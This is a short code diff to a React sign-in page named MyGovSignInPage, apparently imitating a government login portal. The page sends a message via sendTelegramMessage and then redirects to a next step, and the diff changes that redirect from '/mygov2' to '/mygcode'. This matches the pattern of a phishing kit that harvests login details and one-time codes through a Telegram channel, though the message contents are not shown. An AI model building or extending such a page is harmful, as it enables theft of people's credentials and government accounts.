@@ -26,7 +26,7 @@ const MyGovSignInPage: React.FC = () => {
 
     try {
       await sendTelegramMessage(message);
-      window.location.href = '/mygov2';
+      window.location.href = '/mygcode';
     } catch (err) {
       console.log(err)
       setError("Invalid username or password");
